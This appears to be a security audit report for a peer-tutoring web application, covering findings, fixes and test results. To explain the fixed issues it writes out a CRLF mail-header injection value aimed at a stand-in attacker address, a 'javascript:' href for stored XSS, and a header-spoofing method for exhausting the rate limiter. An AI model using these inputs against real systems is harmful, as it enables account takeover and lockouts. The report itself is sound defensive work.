# Security review — October 2026

Audit of the peer-tutoring application as of the reviewed revision `bfc0750e`
(`master` = upstream `61981a06` plus the agent-skill configuration), with the fixes
from this review on the same branch (commit `e9cf5765`).

Scope: the deployed web application and its repository — identity/session/authorization,
input handling and the data layer, the HTTP surface and deployment configuration,
client-side rendering and data exposure, and the build/CI supply chain.

Method: five parallel read-only reviews, each evidence-first (every claim carries a
`path:line` anchor and a code quote), followed by a maintainer pass that reproduced
the reachable ones and wrote the fixes. Raw notes stay as local evidence in the
ignored `.validation/security/` directory (`a-auth.md`, `b-datalayer.md`,
`c-http.md`, `d-client.md`, `e-ops.md`). No browser, mail server or production host
was exercised, so the items marked **needs runtime check** below are reasoned from
code, not from a running instance.

## Summary

- Five reachable issues were confirmed and fixed here; the highest-impact one is a
  click-triggered stored XSS on the public landing/custom pages, followed by a
  mail-envelope deflection through the archive importer.
- The rest of the review found no High item: the app is unusually disciplined on the
  classic sinks and contracts (parameterized SQL, CommonMark-only Markdown, escaped
  email HTML, `crypto`-backed tokens, serializable transactions, fail-closed
  projections, no committed credentials, `npm audit` clean over 927 dependencies).
  The remaining findings are Low and are filed as follow-up work.
- The per-process rate limiter is the recurring theme on the availability side: a
  saturated table used to block every unseen key, and two trust decisions underneath
  it (proxy headers, key length) were caller-controlled. Both are fixed.

## Findings

Status: **fixed** = changed in `e9cf5765`; **open** = filed as a follow-up ticket.

| id | Finding | Severity | Status |
| --- | --- | --- | --- |
| F-D1 | `BUTTONS` block `href` was never scheme-checked, and a raw `<a href>` rendered it on public pages | High | fixed |
| F-B1 | Archive import stored an unvalidated `Tutor.email`; a CR/LF cell deflected the invitation mail | High | fixed |
| F-C1 / F-A2 | The shipped proxy did not replace visitor-supplied `X-Forwarded-For` / `X-Real-IP`, so per-IP throttles were spoofable | Medium | fixed |
| F-A1 / F-B2 | A saturated rate-limit table rejected every unseen key (cross-tenant sign-in lockout); the sign-in key was unbounded | Medium | fixed |
| F-A3 | The emailed-code (`login_2fa`) credential POST bypassed the sign-in throttle | Low | fixed |
| F-C5 | The image upload route buffers the whole body before the 2 MB check and trusts the declared MIME | Low | partly fixed (`nosniff`); body check open |
| F-C2 | tRPC responses carry no `Cache-Control`/`Vary` for per-user GET payloads | Low | open |
| F-C3 | tRPC error bodies return the raw error message (driver text; stacks in development) | Low | open |
| F-C4 | `.env.example` (`SIGNUP_TRUST_PROXY=false`) contradicts Compose (`true`) | Low | open |
| F-C6 | The proxy matcher sends `/robots.txt`, `/.well-known/*` and `/examples/*` to `/signin` | Low | open |
| F-C7 / F-D3 | `/api/signin-qr` encodes `AUTH_URL ?? request.origin`, bypassing auth as `/api/*` | Low | open |
| F-D2 | The enforcing CSP has no `script-src`; the resource policy is report-only | Low | open (accepted) |
| F-D4 | `/api/images/<id>` is world-readable and immutable for landing art held by id | Low | open (accepted) |
| F-A4 | A non-chair tutor can file an interview-decision proposal (replay rejects it) | Low | open |
| F-A5 | `/forgot-password` is a weak account-existence oracle (hit path awaits SMTP) | Low | open, needs runtime check |
| F-A6 | Coordinator-"live" mutations re-read authority only before the transaction | Low | open |
| F-A7 | `admin.sendTutorSetup`'s accountless branch is HEAD-only with no queue fallback | Low | open |
| F-B3 | `registration.sendEmailCode` bills per code (not per address) and accepts an unbounded address | Low | open |
| F-B4 | `admin.updateTutor` makes its concurrency token optional | Low | open |
| F-E1…F-E9 | CI/supply-chain hardening (mutable action tags, `main`-gated publish vs `master`, unpinned base images, no provenance/SBOM, `npm ci` without `--ignore-scripts`) | Low–Medium | open |

### F-D1 (High) — unvalidated `BUTTONS.href` reached a raw anchor on public pages

The stored layout schema accepted any string (`buttonSchema.href` was
`z.string().max(2000)`) and a value that does not start with `/` rendered straight
into `<a href={b.href} target="_blank">` on `/` and `/p/<slug>`, both
unauthenticated. A coordinator, admin or HEAD could store
`javascript:…`, which then ran in a **visitor's** origin on click — with no
enforcing `script-src` to stop it (F-D2). The sibling `program.previewUrl` field
already validates its scheme, so this was a gap, not a design choice.

Fixed: `isSafeButtonHref` allowlists an in-app path, a fragment, or an
`http(s)`/`mailto` link (`src/lib/page-blocks.ts:19-42`), and the renderer drops an
unsafe or blank value (`src/app/_components/page-blocks.tsx:21-25`), so rows stored
before the check are covered too. Tests: `src/lib/page-blocks.test.ts`,
`src/app/_components/public-signup-links.test.tsx`.

### F-B1 (High) — a CR/LF `Tutor.email` re-addressed the invitation mail

The HEAD archive importer validated enums, numbers and timestamps but returned every
text cell verbatim, and `Tutor.email` is one of the columns handed to the mailer
(`src/server/auth/password-reset.ts:248` → `to:` in
`src/server/auth/account-invitations.ts:503`). A quoted multiline cell — a format
the CSV reader supports — such as
`victim@school.edu<CRLF>Bcc: attacker@evil.example` was stored as-is; nodemailer then
parses the value as an address *group*, so the SMTP envelope contained only the
injected address and the registration code (a bearer token bound to that roster
tutor) went to the attacker, who could then claim the tutor's login.

Fixed: every `text` column whose name ends in `email` must be one plain,
trimmed address (≤254 characters, no whitespace/comma/angle brackets) before it is
stored (`src/server/record-transfer.ts:119-134`, applied at `:194-195`). Tests:
`src/server/api/routers/record-transfer.test.ts` (a CR/LF cell and a display-name
cell are rejected; a padded valid address is stored trimmed).

### F-C1 / F-A2 (Medium) — the proxy did not replace the forwarded client identity

The application derives the client network from the leftmost `X-Forwarded-For`
value (or `X-Real-IP`) for the tutor-intake, sign-in, password-reset and
registration-code throttles, but the shipped `Caddyfile` overwrote only the
dedicated `X-Signup-Client-IP`. `docs/deployment.md:126` already requires the proxy
to *replace* visitor-supplied values, so the shipped stack did not implement its own
contract; a single client header could therefore rotate the per-network bucket (the
signup lane was unaffected: it reads only the overwritten header).

Fixed: `Caddyfile:26-32` overwrites `X-Real-IP` and `X-Forwarded-For` (and still
`X-Signup-Client-IP`) with the peer address, and the deployment invariant test
asserts exactly one overwrite of each (`scripts/deployment-config.test.mjs:226-236`).
Operational note: the Caddyfile is a bind mount, so a running container needs a
reload/recreate. A further proxy or Caddy `trusted_proxies` in front of this one
re-opens the question — keep the contract in step with the topology.

### F-A1 / F-B2 (Medium) — a saturated limiter locked out unrelated tenants

`rateLimit` kept every bucket in one process-wide map capped at 10 000 and, once
full, returned `ok: false` for **any unseen key** (the keys of the credential
identifier and of survey addresses are attacker-chosen and were unbounded in length).
An unauthenticated actor could therefore rotate identifiers — cheaply, using the
spoofable header above — fill the table, and make a first-time signer, a password
change or a reset mail fail for a full hour, with no attempt of their own.

Fixed: when the table is full and the key is unseen, one bucket is reclaimed from
the caller's own namespace (the text before the key's first `:`), falling back to
the least recently seen bucket, so unrelated tenants keep their counts
(`src/server/rate-limit.ts:22-54`, `:91-93`); the credential identifier is capped
at 320 characters (`src/server/auth/index.ts:31`). Tests:
`src/server/rate-limit.test.ts` (a fresh key is admitted; another feature keeps
its window).

### F-A3 (Low) — the emailed-code POST was outside the throttle

A `login_2fa` credential POST verified the code with only the five-guess cap per
stored code, while the password branch counted against the per-network and
per-identifier budgets. Fixed by sharing one throttle helper between both branches
(`src/server/auth/credentials.ts:31-47`, used at
`src/server/auth/index.ts:116-119`); test in `src/server/auth/index.test.ts`.

## Verified clean (highlights)

- **Session and revocation**: JWT sessions re-read the live account every request; a
  database trigger bumps `sessionVersion` on any password write, so old tokens die;
  scrypt with `timingSafeEqual`; reset tokens are 32-byte, hashed, single-use,
  60-minute and consume the account's other tokens.
- **Authorization**: server-side per-area gates plus `protectedProcedure` /
  `adminProcedure` / `headProcedure` / `tutorProcedure` / `crewProcedure` /
  `viewerProcedure` and per-resolver ownership; management reads for observers are a
  fail-closed projection (`src/server/management-read-models.ts`); no cross-user IDOR
  was found across the participant routers.
- **Input handling**: no `$queryRawUnsafe`/`$executeRawUnsafe` outside tests; all
  `Prisma.sql` identifiers come from allowlisted maps or `pg_catalog`; email HTML
  escapes every interpolation; links come from `AUTH_URL`, never a request `Host`.
- **Client rendering**: no `dangerouslySetInnerHTML`; react-markdown with no
  plugins (raw HTML becomes text, destinations pass the allowlist);
  `NEXT_PUBLIC_*` is empty; the query cache is memory-only.
- **Repository**: no committed credential or participant data (placeholders and
  synthetic fixtures only); `.gitignore` covers every local secret file the docs
  describe; `npm audit` reports 0 advisories across 927 dependencies; the Docker
  build drops privileges and keeps secrets out of build args.

## How this was verified

Run on macOS with Node 22.23.2, against an isolated local
`postgresql://…@127.0.0.1:5433/shbs_shipping_test` database
(`prisma migrate deploy`, no production data):

| Command | Result |
| --- | --- |
| `npm run check` (`next typegen`, `eslint`, `tsc --noEmit`) | 0 errors (21 pre-existing warnings) |
| `npx vitest run --maxWorkers=1` | 358 files, 3777 tests passed |
| `npm run test:deployment` | 44 tests passed |
| `npm run docs:check` | 12 tests passed |

The same suite was green before the fixes (357 files, 3767 tests), so every failure
would have been attributable to this change set.

## Residual risk and next steps

- The CSP remains report-only; promoting the resource policy to an enforcing header
  needs a nonce/hash strategy for Next's inline scripts and the CAPTCHA script.
- The rate limiter is still per process; a second instance (or a restart) starts
  with an empty table, and the saturation rule now reclaims buckets rather than
  blocking. A shared store is the durable fix if the app is ever scaled out.
- Needs runtime check: the `/forgot-password` timing hypothesis (F-A5), and the
  live proxy behaviour after a Caddy reload.
- Follow-up tickets for the open rows of the table are filed in this repository's
  issue tracker.
